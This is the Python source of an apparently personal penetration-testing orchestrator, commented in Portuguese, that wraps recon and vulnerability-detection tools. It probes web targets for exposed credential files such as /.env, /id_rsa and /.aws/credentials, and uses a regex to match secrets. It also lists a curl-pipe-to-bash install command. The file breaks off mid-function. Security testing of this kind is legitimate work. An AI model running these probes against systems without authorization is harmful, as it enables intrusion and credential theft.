#!/usr/bin/env python3
"""
nvkscan.py -- orquestrador unico, com todos os modulos do
pentest_metodologia.html integrados, com opcao de selecionar o que rodar.

NAO e publicado no GitHub (fica de fora do repo via .gitignore) -- uso local.

USO INTERATIVO (menu pra escolher o modulo):
    python3 nvkscan.py

USO DIRETO (scriptavel):
    python3 nvkscan.py --module web       -d alvo.com -u https://alvo.com --active
    python3 nvkscan.py --module bugbounty -d alvo.com --program nome-do-programa
    python3 nvkscan.py --module api       -d alvo.com -u https://api.alvo.com --active
    python3 nvkscan.py --module cloud     --aws-profile default
    python3 nvkscan.py --module redteam   -d alvo.com
    python3 nvkscan.py --module mobile    --apk caminho/alvo.apk
    python3 nvkscan.py --module wireless  --iface wlan0
    python3 nvkscan.py --module dcpt      -d alvo.com --ip 10.10.10.10

Principio seguido em TODO modulo (mesmo do Modulo 11 do guia: "scanner e
ponto de partida, nao veredito"):
  - Recon, enumeracao e deteccao de vulnerabilidade (nuclei, dalfox, sqlmap em
    modo deteccao) sao automatizados.
  - Forca bruta de login/2FA, upload de webshell, extracao de dados via sqlmap
    (--dump), deploy de C2/phishing e qualquer coisa destrutiva NAO sao
    automatizados -- ficam como passo manual explicito no relatorio final,
    exigindo julgamento humano a cada acao (igual o Modulo 7/DCPT do guia
    proibe auto-exploit mesmo no exame oficial).
  - Sempre exige confirmacao explicita de autorizacao por escrito antes de
    rodar qualquer coisa contra um alvo.
"""

import argparse
import concurrent.futures
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib import Path


class C:
    """Codigos ANSI. Desativados sozinhos se a saida nao for um terminal
    interativo (redirecionamento pra arquivo, pipe, NO_COLOR definido)."""
    _enabled = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
    RESET = "\033[0m" if _enabled else ""
    BOLD = "\033[1m" if _enabled else ""
    DIM = "\033[2m" if _enabled else ""
    RED = "\033[38;5;203m" if _enabled else ""
    CYAN = "\033[38;5;51m" if _enabled else ""
    GREEN = "\033[38;5;120m" if _enabled else ""
    AMBER = "\033[38;5;214m" if _enabled else ""
    GRAY = "\033[38;5;245m" if _enabled else ""
    WHITE = "\033[38;5;255m" if _enabled else ""


BANNER_RULE = "─" * 68  # ascii-safe: so usa o caractere de linha simples (U+2500),
# ja confirmado renderizando certo no terminal do usuario em todas as capturas desta sessao

MODULE_TAGS = {
    "web": "recon + exploracao",
    "bugbounty": "hunting continuo",
    "redteam": "TTP mapping",
    "cloud": "AWS / Azure / GCP",
    "mobile": "analise de APK",
    "wireless": "setup / recon",
    "api": "BOLA / BOPLA",
    "dcpt": "sem auto-exploit",
}

MODULE_SHORT = {
    "web": "Pentest Web",
    "bugbounty": "Bug Bounty",
    "redteam": "Red Team",
    "cloud": "Cloud",
    "mobile": "Mobile",
    "wireless": "Wireless",
    "api": "API Pentest",
    "dcpt": "DCPT",
}


def print_banner():
    print()
    print(f"{C.RED}{C.BOLD}{BANNER_RULE}{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}PENTEST{C.RESET}{C.RED}{C.BOLD}::{C.RESET}{C.BOLD}{C.RED}TOOLKIT{C.RESET}   "
          f"{C.GRAY}orquestrador unificado{C.RESET}")
    print(f"  {C.DIM}{C.GRAY}offensive security ops  |  by nakps{C.RESET}")
    print(f"{C.RED}{C.BOLD}{BANNER_RULE}{C.RESET}")
    print()

# =============================================================================
# INFRAESTRUTURA COMPARTILHADA
# =============================================================================

TOOL_INSTALL = {
    "subfinder": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    "httpx": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
    "katana": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
    "nuclei": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    "gau": "go install github.com/lc/gau/v2/cmd/gau@latest",
    "waybackurls": "go install github.com/tomnomnom/waybackurls@latest",
    "arjun": "pip install arjun",
    "wafw00f": "pip install wafw00f",
    "ffuf": "apt install ffuf",
    "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
    "sqlmap": "apt install sqlmap",
    "sslscan": "apt install sslscan",
    "anew": "go install github.com/tomnomnom/anew@latest",
    "theHarvester": "pip install theHarvester",
    "amass": "apt install amass",
    "assetfinder": "go install github.com/tomnomnom/assetfinder@latest",
    "puredns": "go install github.com/d3mondev/puredns/v2@latest",
    "gowitness": "go install github.com/sensepost/gowitness@latest",
    "nmap": "apt install nmap",
    "masscan": "apt install masscan",
    "notify": "go install github.com/projectdiscovery/notify/cmd/notify@latest",
    "crackmapexec": "pip install crackmapexec",
    "enum4linux-ng": "pip install enum4linux-ng",
    "enum4linux": "apt install enum4linux",
    "ldapsearch": "apt install ldap-utils",
    "rpcclient": "apt install smbclient",
    "smbclient": "apt install smbclient",
    "gpp-decrypt": "apt install gpp-decrypt (gem install gpp-decrypt se via Ruby)",
    "bloodhound-python": "pip install bloodhound",
    "impacket-GetNPUsers": "pip install impacket",
    "impacket-GetUserSPNs": "pip install impacket",
    "pacu": "pip install pacu",
    "trufflehog": "pip install trufflehog (ou baixar binario Go)",
    "cloud_enum": "pip install cloud_enum",
    "apktool": "apt install apktool",
    "jadx": "baixar release em github.com/skylot/jadx",
    "airmon-ng": "apt install aircrack-ng",
    "aircrack-ng": "apt install aircrack-ng",
    "airodump-ng": "apt install aircrack-ng",
    "hashcat": "apt install hashcat",
    "gobuster": "apt install gobuster",
    "aws": "apt install awscli",
    "az": "curl -sL https://aka.ms/InstallAzureCLIDeb | bash",
    "gcloud": "ver cloud.google.com/sdk/docs/install",
}

SECLISTS_DIRS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
SECLISTS_DIRS_MEDIUM = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
SECLISTS_DIRS_LARGE = "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
SECLISTS_DIRS_BY_SIZE = {
    "small": SECLISTS_DIRS_SMALL, "medium": SECLISTS_DIRS_MEDIUM, "large": SECLISTS_DIRS_LARGE,
}
SECLISTS_SUBS_5000 = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
ROCKYOU = "/usr/share/wordlists/rockyou.txt"

SENSITIVE_PATHS = [
    "/.env", "/.env.bak", "/.git/config", "/.git/HEAD", "/config.php.bak",
    "/wp-config.php.bak", "/backup.zip", "/backup.sql", "/database.sql",
    "/dump.sql", "/.DS_Store", "/web.config", "/id_rsa", "/.ssh/id_rsa",
    "/.aws/credentials", "/composer.json", "/package.json", "/.htpasswd",
]
ADMIN_API_PATHS = [
    "/swagger.json", "/swagger-ui.html", "/api-docs", "/openapi.json",
    "/actuator", "/actuator/env", "/actuator/heapdump", "/graphql", "/graphiql",
    "/.well-known/security.txt", "/server-status", "/server-info", "/phpinfo.php",
    "/debug", "/console", "/admin", "/admin.php", "/administrator",
    "/manager/html", "/jenkins", "/.git", "/.svn", "/elmah.axd", "/trace.axd",
]


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def which(tool):
    return shutil.which(tool)


_LEVEL_COLOR = {
    "INFO": C.GRAY, " OK ": C.GREEN, "WARN": C.AMBER, "SKIP": C.GRAY, "STEP": C.RED,
}
# tags curtas estilo ferramentas ProjectDiscovery (nuclei/subfinder/httpx, que o
# toolkit ja chama) -- visual mais limpo/moderno que "[INFO]"/"[WARN]" por extenso
_LEVEL_TAG = {
    "INFO": "INF", " OK ": "OK ", "WARN": "WRN", "SKIP": "SKP",
}


class Log:
    def __init__(self, path: Path):
        path.parent.mkdir(parents=True, exist_ok=True)
        self.fh = open(path, "a", encoding="utf-8")
        self._lock = threading.Lock()  # M1.2 roda ferramentas em paralelo, varias threads podem logar ao mesmo tempo

    def _write(self, level, msg):
        full_ts = ts()
        plain = f"[{full_ts}] [{level}] {msg}"
        color = _LEVEL_COLOR.get(level, "")
        bold = C.BOLD if level == "STEP" else ""
        with self._lock:
            self.fh.write(plain + "\n")
            self.fh.flush()
            _clear_active_spinner_line()  # senao a linha da barra de progresso fica bagunçada
            hhmmss = full_ts.split("T")[-1].rstrip("Z")  # arquivo guarda ISO completo, terminal so HH:MM:SS
            tag = _LEVEL_TAG.get(level)
            if tag:
                print(f"  {C.DIM}{hhmmss}{C.RESET} {color}{C.BOLD}[{tag}]{C.RESET} {color if level=='WARN' else C.WHITE}{msg}{C.RESET}")
            elif level == "STEP":
                # step() ja monta a mensagem com a seta ">>" e a regua, sem
                # precisar de tag "[STEP]" -- vira um cabecalho de secao, nao
                # mais uma linha de log igual as outras
                print()
                print(f"{color}{bold}{msg}{C.RESET}")
            else:
                print(f"{C.DIM}{hhmmss}{C.RESET} {color}{bold}[{level}]{C.RESET} {bold}{msg}{C.RESET}")

    def info(self, msg): self._write("INFO", msg)
    def ok(self, msg): self._write(" OK ", msg)
    def warn(self, msg): self._write("WARN", msg)
    def skip(self, msg): self._write("SKIP", msg)
    def step(self, msg): self._write("STEP", ">> " + msg + " " + "─" * max(0, 50 - len(msg)))


_SPINNER_FRAMES = "|/-\\"  # ASCII puro -- braille/blocos unicode nao renderizam em todo terminal/fonte
_PROGRESS_BAR_WIDTH = 30

# Coordenacao entre a barra de progresso e o Log: no recon em paralelo do
# M1.2, varias threads chamam log.info("$ comando") AO MESMO TEMPO que a
# barra do grupo esta desenhando sua propria linha com \r -- sem isso, a
# escrita de uma thread no meio do \r da outra bagunça a linha (foi visto
# na pratica: a barra virava uns "prints" estaticos espalhados pelo log em
# vez de uma animacao continua). A barra se registra como "ativa" enquanto
# roda; o Log limpa essa linha ANTES de imprimir qualquer coisa, e a propria
# thread da barra a redesenha sozinha no proximo ciclo (0.12s depois) -- sem
# precisar de nenhum sinal explicito de "retomar".
_active_spinner_lock = threading.Lock()
_active_spinner = None


def _register_spinner(sp):
    global _active_spinner
    with _active_spinner_lock:
        _active_spinner = sp


def _unregister_spinner(sp):
    global _active_spinner
    with _active_spinner_lock:
        if _active_spinner is sp:
            _active_spinner = None


def _clear_active_spinner_line():
    with _active_spinner_lock:
        sp = _active_spinner
    if sp is not None and sys.stdout.isatty():
        sys.stdout.write("\r" + " " * 90 + "\r")
        sys.stdout.flush()


class Spinner:
    """Barra de progresso animada em tempo real (estilo instalacao do pip),
    pra operacoes demoradas (ffuf, gau, arjun, nmap...) onde antes a unica
    pista de que o script nao travou era esperar o passo inteiro terminar.

    Com terminal interativo: anima um spinner + tempo decorrido, e vira uma
    barra [####....] XX% de verdade quando algum percentual real esta
    disponivel (hoje so o nmap com --stats-every expoe isso de forma
    parseavel). Sem terminal interativo (saida redirecionada pra arquivo,
    como em todo teste em background desta sessao), nao tenta desenhar \\r
    -- so imprime uma linha de "ainda rodando" a cada ~15s, pra dar sinal de
    vida no log sem floodar o arquivo com milhares de linhas de carriage
    return."""

    def __init__(self, label, log: "Log" = None):
        self.label = label
        self.log = log
        self._percent = None
        self._stop = threading.Event()
        self._thread = None
        self._start = 0.0

    def set_percent(self, pct):
        self._percent = pct

    def _loop(self):
        i = 0
        interactive = sys.stdout.isatty()
        last_heartbeat = 0.0
        while not self._stop.is_set():
            elapsed = time.time() - self._start
            mm, ss = divmod(int(elapsed), 60)
            if interactive:
                frame = _SPINNER_FRAMES[i % len(_SPINNER_FRAMES)]
                if self._percent is not None:
                    # percentual real (hoje: nmap --stats-every, ou contagem
                    # exata nas checagens em Python) -- barra solida estilo
                    # pip/pip3, enche de acordo com o progresso de verdade,
                    # nunca anda sozinha
                    filled = max(0, min(_PROGRESS_BAR_WIDTH, int(self._percent / 100 * _PROGRESS_BAR_WIDTH)))
                    bar = f"{C.GREEN}{'#' * filled}{C.RESET}{'-' * (_PROGRESS_BAR_WIDTH - filled)}"
                    line = (f"\r{C.CYAN}{frame}{C.RESET} {self.label}  "
                            f"|{bar}| {self._percent:5.1f}%  {mm:02d}:{ss:02d}")
                else:
                    # sem percentual real disponivel (ffuf/gau/arjun/etc. nao
                    # expoem total de forma segura, e com -recursion o ffuf
                    # nem tem um total fixo pra medir) -- so spinner + tempo
                    # decorrido, SEM barra nenhuma. Nada de animacao andando
                    # de um lado pro outro fingindo progresso que nao existe.
                    line = f"\r{C.CYAN}{frame}{C.RESET} {self.label}  {mm:02d}:{ss:02d}"
                sys.stdout.write(line + " " * 8)
                sys.stdout.flush()
            elif elapsed - last_heartbeat >= 15:
                last_heartbeat = elapsed
                msg = f"  ... {self.label} ainda rodando ({mm:02d}:{ss:02d})"
                if self.log:
                    self.log.info(msg)
                else:
                    print(f"{C.GRAY}{msg}{C.RESET}")
            i += 1
            self._stop.wait(0.12)

    def start(self):
        self._start = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        _register_spinner(self)
        return self

    def stop(self):
        self._stop.set()
        _unregister_spinner(self)
        if self._thread:
            self._thread.join(timeout=1)
        if sys.stdout.isatty():
            sys.stdout.write("\r" + " " * 90 + "\r")
            sys.stdout.flush()


def _kill_process_group(proc):
    """Mata o GRUPO inteiro de processos, nao so o filho direto. Com
    shell=True o filho direto do Python e o /bin/sh, e a ferramenta de
    verdade (arjun, katana...) e NETA do Python -- so matar o filho direto
    (o que subprocess.run(timeout=) faz sozinho) deixa a ferramenta real
    orfa, rodando pra sempre sem controle. Confirmado na pratica: katana e
    arjun continuavam vivos (ps aux) minutos depois do proprio script ja
    ter seguido em frente pro proximo passo."""
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def run(cmd, log: Log, outfile: Path = None, timeout=180, input_text=None, label=None, retries=0):
    """label: quando informado, mostra uma barra/spinner de progresso em
    tempo real enquanto o comando roda (ver classe Spinner). Sem label,
    comportamento identico a antes (chamadas rapidas nao precisam disso).

    retries: numero de tentativas EXTRAS especificamente quando da TIMEOUT
    (nao quando o comando roda e so retorna codigo de erro -- isso quase
    nunca muda tentando de novo, mas timeout costuma ser transitorio: rede
    lenta, DNS falhando na hora, servidor momentaneamente devagar). Sem
    isso, um timeout passageiro perdia a informacao daquele passo pro
    resto da execucao."""
    printable = cmd if isinstance(cmd, str) else " ".join(cmd)
    log.info(f"$ {printable}")
    spinner = Spinner(label, log).start() if label else None
    try:
        attempt = 0
        while True:
            try:
                proc = subprocess.Popen(
                    cmd, shell=isinstance(cmd, str),
                    stdin=subprocess.PIPE if input_text else None,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                    start_new_session=True,  # cria process group proprio, ver _kill_process_group
                )
            except FileNotFoundError:
                log.skip(f"  binario nao encontrado: {printable.split()[0]}")
                return -2, ""
            try:
                stdout, stderr = proc.communicate(input=input_text, timeout=timeout)
            except subprocess.TimeoutExpired:
                _kill_process_group(proc)
                try:
                    proc.communicate(timeout=5)
                except Exception:
                    pass
                if attempt < retries:
                    attempt += 1
                    log.warn(f"  timeout ({timeout}s) estourado, tentativa {attempt}/{retries+1}, tentando de novo...")
                    continue
                log.warn(f"  timeout ({timeout}s) estourado apos {attempt+1} tentativa(s), pulando")
                return -1, ""
            break
        out = (stdout or "") + (stderr or "")
        if outfile:
            outfile.write_text(out, encoding="utf-8", errors="replace")
        if proc.returncode != 0:
            if outfile:
                log.warn(f"  comando saiu com codigo {proc.returncode} (saida em {outfile})")
            else:
                trecho = " | ".join(out.strip().splitlines()[-3:]) if out.strip() else "(sem saida)"
                log.warn(f"  comando saiu com codigo {proc.returncode}: {trecho[:200]}")
        return proc.returncode, out
    finally:
        if spinner:
            spinner.stop()


_NMAP_PCT_RE = re.compile(r"About ([\d.]+)% done")


def run_nmap_live(cmd, log: Log, label, outfile: Path = None, timeout=600):
    """Mesma ideia do run(), mas especifica pro nmap: acrescenta
    --stats-every pra ele reportar percentual real de progresso em stderr, e
    le a saida linha a linha (em vez de esperar o processo inteiro terminar,
    como subprocess.run faz) pra alimentar a barra de progresso com o %
    verdadeiro em vez de so um spinner indeterminado. E a unica ferramenta
    do toolkit que expoe isso de forma nativa e facil de parsear."""
    if "--stats-every" not in cmd:
        cmd = f"{cmd} --stats-every 3s"
    log.info(f"$ {cmd}")
    spinner = Spinner(label, log).start()
    lines_out = []
    rc = -1
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1,
                                 start_new_session=True)
    except FileNotFoundError:
        spinner.stop()
        log.skip(f"  binario nao encontrado: {cmd.split()[0]}")
        return -2, ""
    start = time.time()
    timed_out = False
    try:
        while True:
            if timeout and (time.time() - start) > timeout:
                _kill_process_group(proc)
                timed_out = True
                break
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    break
                continue
            lines_out.append(line.rstrip("\n"))
            m = _NMAP_PCT_RE.search(line)
            if m:
                spinner.set_percent(float(m.group(1)))
        if not timed_out:
            rc = proc.wait()
    finally:
        spinner.stop()
    out = "\n".join(lines_out)
    if timed_out:
        log.warn(f"  timeout ({timeout}s) estourado, pulando")
        if outfile:
            outfile.write_text(out, encoding="utf-8", errors="replace")
        return -1, out
    if outfile:
        outfile.write_text(out, encoding="utf-8", errors="replace")
    if rc != 0:
        if outfile:
            log.warn(f"  comando saiu com codigo {rc} (saida em {outfile})")
        else:
            trecho = " | ".join(lines_out[-3:]) if lines_out else "(sem saida)"
            log.warn(f"  comando saiu com codigo {rc}: {trecho[:200]}")
    return rc, out


_seclists_root_cache = None


def _seclists_cache_file():
    return Path.home() / ".nvkscan_seclists_path"


def find_seclists_root(log: Log):
    """Localiza a pasta raiz do SecLists em QUALQUER lugar do sistema,
    independente de maiuscula/minuscula ou de onde foi instalado (git clone
    manual, snap, em outro usuario). Usa locate primeiro (rapido), cai pra
    find se locate nao existir ou nao achar nada. Resultado fica em cache
    (arquivo + memoria) pro resto da execucao nao precisar buscar de novo."""
    global _seclists_root_cache
    if _seclists_root_cache is not None:
        return _seclists_root_cache or None

    cache_file = _seclists_cache_file()
    if cache_file.exists():
        cached = cache_file.read_text(encoding="utf-8").strip()
        if cached and Path(cached, "Discovery").is_dir():
            _seclists_root_cache = cached
            return cached

    candidates = []
    if which("locate"):
        rc, out = run("locate -i --regex '/seclists$'", log, timeout=15)
        candidates += [l.strip() for l in out.splitlines() if l.strip()]

    # o banco do locate pode estar desatualizado (pasta movida/apagada depois
    # da ultima updatedb), entao SEMPRE reforca com find tambem, nao so quando
    # locate nao acha nada -- um candidato do locate pode existir mas ser
    # invalido (sem a estrutura certa dentro), e so o find acha o caminho real
    search_roots = [r for r in ("/home", "/root", "/opt", "/usr/share", "/var/snap")
                     if Path(r).exists()]
    if search_roots:
        log.info("conferindo com find tambem (reforco, caso o locate esteja desatualizado)...")
        rc, out = run(
            f"find {' '.join(search_roots)} -maxdepth 8 -iname 'seclists' -type d 2>/dev/null",
            log, timeout=40,
        )
        candidates += [l.strip() for l in out.splitlines() if l.strip()]

    # entre os candidatos (de locate + find), so aceita um que realmente tem a
    # estrutura do repo (a pasta Discovery/ por dentro), senao pode ser um
    # caminho fantasma do locate ou um pacote snap incompleto
    seen = set()
    for c in candidates:
        if c in seen:
            continue
        seen.add(c)
        if Path(c, "Discovery").is_dir():
            _seclists_root_cache = c
            try:
                cache_file.write_text(c, encoding="utf-8")
            except Exception:
                pass
            log.ok(f"SecLists encontrado em {c} (cacheado em {cache_file.name} pra proxima vez)")
            return c

    _seclists_root_cache = ""
    log.skip("SecLists nao encontrado em lugar nenhum do sistema (locate/find). "
              "Instale com: git clone https://github.com/danielmiessler/SecLists ~/SecLists")
    return None


def find_wordlist(relative_path_under_seclists, log: Log):
    """Acha um arquivo de wordlist do SecLists a partir do caminho padrao
    (ex.: /usr/share/seclists/Discovery/Web-Content/x.txt), tentando achar a
    raiz real do SecLists no sistema caso nao esteja nesse caminho padrao."""
    if Path(relative_path_under_seclists).exists():
        return relative_path_under_seclists

    marker = "/usr/share/seclists/"
    if relative_path_under_seclists.startswith(marker):
        suffix = relative_path_under_seclists[len(marker):]
    elif "seclists/" in relative_path_under_seclists.lower():
        suffix = relative_path_under_seclists.split("seclists/", 1)[-1]
    else:
        suffix = None

    if not suffix:
        return None

    root = find_seclists_root(log)
    if not root:
        return None
    candidate = str(Path(root) / suffix)
    if Path(candidate).exists():
        return candidate
    log.skip(f"SecLists esta em {root}, mas nao achei {suffix} dentro dele (estrutura diferente do esperado)")
    return None


def require_tool(tool, log: Log):
    if which(tool):
        return True
    install = TOOL_INSTALL.get(tool, f"verifique se '{tool}' esta instalado (which {tool})")
    log.skip(f"{tool} nao encontrado. Instale com: {install}")
    return False


def http_get_status(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.getheaders())
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {})
    except Exception:
        return None, {}


def fetch_body_snippet(url, max_bytes=4000, timeout=8):
    """Busca um pedaco do corpo da resposta, pra validacao de segunda camada
    (confirmar que um 200 e conteudo de verdade, nao uma pagina generica)."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            content_type = resp.headers.get("Content-Type", "")
            body = resp.read(max_bytes).decode("utf-8", errors="ignore")
            return content_type, body
    except Exception:
        return "", ""


def looks_like_real_file(path, content_type, body):
    """Segunda camada de validacao: confirma que um 200 em cima de um
    caminho 'sensivel' e conteudo de arquivo de verdade, nao a mesma pagina
    de app/SPA generica disfarcada de 200 (ja vimos isso acontecer no
    Modulo 1 e no Modulo 7, os dois jeitos de medir so por status enganavam)."""
    ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
    body_lower = body.lower()
    looks_like_html_shell = "<html" in body_lower and ("<script" in body_lower or "<!doctype html" in body_lower)
    if not looks_like_html_shell:
        return True  # nao parece pagina generica, aceita como esta
    # a partir daqui, o corpo PARECE uma pagina de app/SPA -- so aceita se o
    # proprio tipo de arquivo esperado for mesmo HTML (ex.: swagger-ui.html)
    if ext in ("json", "env", "sql", "bak", "old", "log", "yml", "yaml", "config"):
        return False
    if path in ("/.git/config", "/.git/HEAD", "/.aws/credentials"):
        return False
    if "application/json" in content_type and looks_like_html_shell:
        return False
    return True


_SENSITIVE_CONTENT_PATTERNS = re.compile(
    r"(password\s*[=:]|passwd\s*[=:]|secret\s*[=:]|api[_-]?key\s*[=:]|private[_-]?key|"
    r"-----BEGIN (RSA|OPENSSH|EC|DSA|PRIVATE) KEY|DB_PASSWORD|aws_secret_access_key|"
    r"mysql://|postgres(ql)?://|mongodb(\+srv)?://)",
    re.I,
)
_HTML_SHELL_EXTS = {"json", "env", "sql", "bak", "old", "log", "yml", "yaml", "config"}


def score_finding_confidence(path, content_type, body, baseline_body):
    """Terceira camada: em vez do sim/nao binario do looks_like_real_file,
    da uma pontuacao 0-100 somando varios sinais observaveis -- nao e um
    modelo treinado (sem dataset rotulado pra isso), e uma soma ponderada
    transparente, onde cada sinal fica registrado no motivo (nada de
    caixa-preta). >=70 ALTA confianca (conta como achado), 40-69 MEDIA
    (fica pra revisao manual, nao conta sozinho), <40 BAIXA (descartado).
    """
    score = 50.0
    reasons = []
    ext = path.rsplit(".", 1)[-1].lower() if "." in path else ""
    body_lower = body.lower()
    looks_like_html_shell = "<html" in body_lower and ("<script" in body_lower or "<!doctype html" in body_lower)

    if looks_like_html_shell and ext in _HTML_SHELL_EXTS:
        score -= 40
        reasons.append("corpo parece pagina HTML generica, mas extensao esperava dado bruto (-40)")
    if looks_like_html_shell and "application/json" in (content_type or "").lower():
        score -= 30
        reasons.append("Content-Type diz JSON mas corpo parece HTML (-30)")

    if baseline_body is not None and body.strip() and body.strip() == baseline_body.strip():
        score -= 50
        reasons.append("corpo identico ao baseline, provavel soft-404/catch-all (-50)")
    elif baseline_body and body.strip():
        len_diff = abs(len(body) - len(baseline_body)) / max(1, len(baseline_body))
        if len_diff > 0.3:
            score += 15
            reasons.append(f"corpo {len_diff*100:.0f}% diferente em tamanho do baseline (+15)")

    if _SENSITIVE_CONTENT_PATTERNS.search(body):
        score += 25
        reasons.append("padrao de segredo/credencial encontrado no corpo (+25)")

    if ext in ("sql", "env", "bak", "zip", "log") and content_type and "text/html" not in content_type.lower():
        score += 10
        reasons.append(f"Content-Type ({content_type}) compativel com a extensao esperada (+10)")

    score = max(0.0, min(100.0, score))
    tier = "ALTA" if score >= 70 else ("MEDIA" if score >= 40 else "BAIXA")
    return score, tier, reasons


def looks_like_real_bucket(provider, body):
    """Confirma que um 200 numa URL de bucket S3/GCS e mesmo uma listagem de
    bucket de verdade (assinatura real da resposta), nao uma pagina generica
    de algum servico que por acaso responde 200 nesse mesmo hostname."""
    if provider == "S3":
        return "<listbucketresult" in body.lower() or "<error" in body.lower()
    if provider == "GCS":
        b = body.lower()
        return '"kind": "storage#objects"' in b or '"kind":"storage#objects"' in b or "<error" in b
    return True


def threaded_status_checks(urls, timeout=6, max_workers=20, spinner: "Spinner" = None):
    """Faz GET em varias URLs em paralelo (ate max_workers por vez) e retorna
    uma lista de (url, status_code) na MESMA ordem de entrada. Usado em todo
    check que antes era sequencial (arquivos sensiveis, admin/API, buckets).

    Com spinner informado, atualiza o percentual REAL de progresso (nao
    estimado) a cada URL que termina -- diferente do ffuf/nmap, aqui o total
    e conhecido de antemao (len(urls)) e cada conclusao e um evento exato
    que o proprio Python observa, entao o % mostrado e genuino."""
    results = [None] * len(urls)
    total = len(urls)
    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(http_get_status, u, timeout): i for i, u in enumerate(urls)}
        for fut in concurrent.futures.as_completed(futures):
            i = futures[fut]
            try:
                code, _ = fut.result()
            except Exception:
                code = None
            results[i] = (urls[i], code)
            done += 1
            if spinner:
                spinner.set_percent(done / total * 100)
    return results


def check_paths(base_url, paths, outfile: Path, log: Log, label="caminhos", threads=20):
    """So conta como achado de verdade o status 200 (exposto de fato).
    401/403 significa bloqueado (nao prova exposicao, so que o padrao de
    caminho existe/e tratado). Usa baseline com path aleatorio pra filtrar
    sites que devolvem 200 generico pra qualquer coisa (soft-404)."""
    import random
    probe = f"/__naoexiste_{random.randint(100000, 999999)}__"
    baseline_code, _ = http_get_status(base_url.rstrip("/") + probe)
    if baseline_code is None:
        log.warn(f"  alvo nao respondeu nem no baseline (sem conexao/DNS?), pulando {label}")
        outfile.write_text("(alvo nao respondeu, checagem nao realizada)", encoding="utf-8")
        return []
    _, baseline_body = fetch_body_snippet(base_url.rstrip("/") + probe)
    log.info(f"baseline (path inexistente de proposito): status {baseline_code}")
    log.info(f"checando {label} ({len(paths)} caminhos, {threads} em paralelo)...")

    full_urls = [base_url.rstrip("/") + p for p in paths]
    spinner = Spinner(f"checando {label}", log).start()
    try:
        results = threaded_status_checks(full_urls, max_workers=threads, spinner=spinner)
    finally:
        spinner.stop()
    candidates_200, blocked = [], []
    for (full_url, code), p in zip(results, paths):
        if code is None or code == baseline_code:
            continue  # igual ao baseline = provavelmente nao existe de verdade
        if code == 200:
            candidates_200.append((full_url, p))
        elif code in (401, 403):
            blocked.append(f"{code} {p}")

    # terceira camada: pontuacao ponderada por multiplos sinais (score_finding_confidence)
    # em vez do sim/nao binario -- ALTA confianca conta como achado, MEDIA fica
    # pra revisao manual (nao conta sozinho, mas nao se perde no limbo do
    # "descartado"), BAIXA e descartada (provavel falso positivo)
    exposed, review, discarded = [], [], []
    for full_url, p in candidates_200:
        content_type, body = fetch_body_snippet(full_url)
        score, tier, reasons = score_finding_confidence(p, content_type, body, baseline_body)
        linha = f"200 {p} :: confianca {score:.0f}/100 ({tier}) :: " + "; ".join(reasons)
        if tier == "ALTA":
            exposed.append(linha)
        elif tier == "MEDIA":
            review.append(linha)
        else:
            discarded.append(linha)
    if review:
        log.warn(f"  {len(review)} candidato(s) com confianca MEDIA em {label} -- revisar manualmente, "
                 f"ver {outfile.name}")
    if discarded:
        log.info(f"  {len(discarded)} candidato(s) com 200 descartado(s) na validacao de conteudo "
                 f"(confianca BAIXA, provavel falso positivo, nao contam como achado)")

    outfile.write_text(
        "EXPOSTO (confianca ALTA >=70/100, achado real, conta no relatorio):\n" + ("\n".join(exposed) or "(nenhum)") +
        "\n\nREVISAR MANUALMENTE (confianca MEDIA 40-69/100, inconclusivo):\n" + ("\n".join(review) or "(nenhum)") +
        "\n\nBLOQUEADO (401/403, caminho existe/e tratado mas sem acesso direto, NAO conta como achado):\n" +
        ("\n".join(blocked) or "(nenhum)") +
        "\n\nDESCARTADO (confianca BAIXA <40/100, provavel falso positivo):\n" +
        ("\n".join(discarded) or "(nenhum)"),
        encoding="utf-8",
    )
    if exposed:
        log.warn(f"  {len(exposed)} achado(s) REAL(IS) e VALIDADO(S) (200, confianca ALTA) em {label}, "
                 f"ver {outfile.name}")
    if blocked:
        log.info(f"  {len(blocked)} caminho(s) bloqueado(s) (401/403) em {label} (nao conta como achado)")
    if not exposed and not blocked and not review:
        log.ok(f"  nada em {label}")
    return exposed


def authorization_gate(target, module_name, active, skip=False):
    mode_label = (f"{C.AMBER}ATIVO (deteccao de vulnerabilidade){C.RESET}" if active
                  else f"{C.CYAN}PASSIVO (so recon/enumeracao){C.RESET}")
    print()
    print(f"{C.RED}{C.BOLD}{module_name.upper()}{C.RESET}  {C.GRAY}:: orquestrador{C.RESET}")
    print(f"{C.GRAY}{'─' * 60}{C.RESET}")
    print(f"  {C.GRAY}alvo{C.RESET}   {C.WHITE}{target}{C.RESET}")
    print(f"  {C.GRAY}modo{C.RESET}   {mode_label}")
    print()
